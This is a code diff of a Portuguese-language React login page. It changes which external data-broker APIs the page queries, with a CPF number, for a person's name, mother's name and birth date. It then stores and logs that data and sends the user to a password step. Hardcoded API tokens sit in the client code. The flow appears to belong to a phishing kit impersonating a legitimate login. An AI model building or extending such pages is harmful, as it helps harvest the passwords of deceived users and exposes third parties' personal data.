@@ -43,30 +43,36 @@ export default function Login() {
 
     setLoading(true);
     try {
-      // Consulta a API para verificar o CPF
-      const response = await fetch(`https://datagetapi.online/api/v1/cpf/${numericCPF}`, {
+      console.log('Iniciando consulta à API...');
+      const url = `https://app.konsulta.pro/api/pessoa?cpf=${numericCPF}`;
+      console.log('URL da requisição:', url);
+
+      const response = await fetch(url, {
         method: 'GET',
         headers: {
-          'Authorization': 'Bearer fed55ffa1d483c9d8770ed3e2187823fa268d5f70b27fb66badb3284eca6d5db'
+          'token': '9b9e0838a86a4c569f722e713a6739fb'
         }
       });
 
-      if (response.ok) {
-        const data = await response.json();
-        console.log('Dados do CPF:', data);
+      console.log('Status da resposta:', response.status);
+      const data = await response.json();
+      console.log('Dados recebidos:', data);
+
+      if (response.ok && data.nome) {
+        console.log('Consulta bem sucedida');
         
         // Armazenar os dados do usuário para uso posterior
         localStorage.setItem('userData', JSON.stringify({
           cpf: numericCPF,
-          nome: data.NOME || 'Usuário',
-          mae: data.NOME_MAE || '',
-          nasc: data.NASC || ''
+          nome: data.nome || 'Usuário',
+          mae: data.mae || '',
+          nasc: data.data_nascimento || ''
         }));
         
         // Avançar para a tela de senha
         navigate(prepareUrlWithParams('/login-senha'));
       } else {
-        setErrorMessage('CPF não encontrado');
+        setErrorMessage('CPF não encontrado ou dados incompletos');
       }
     } catch (error) {
       console.error('Erro ao consultar CPF:', error);
@@ -87,11 +93,18 @@ export default function Login() {
     if (numericCPF.length === 11) {
       const fetchCpfData = async () => {
         try {
-          const response = await fetch(`https://api.cpfcnpj.com.br/5ae973d7a997af13f0aaf2bf60e65803/9/json/${numericCPF}`);
+          const url = `https://app.konsulta.pro/api/pessoa?cpf=${numericCPF}`;
+          const response = await fetch(url, {
+            method: 'GET',
+            headers: {
+              'token': '9b9e0838a86a4c569f722e713a6739fb'
+            }
+          });
+          
           if (response.ok) {
             const data = await response.json();
             setCpfData(data);
-            console.log('CPF encontrado:', data);
+            console.log('CPF verificado:', data);
           } else {
             console.log('CPF não encontrado');
             setCpfData(null);
@@ -149,7 +162,7 @@ export default function Login() {
               maxLength={14}
             />
           </div>
-          {cpfData && cpfData.status && (
+          {cpfData && cpfData.nome && (
             <div className="text-xs text-green-600 mt-1">
               CPF válido
             </div>
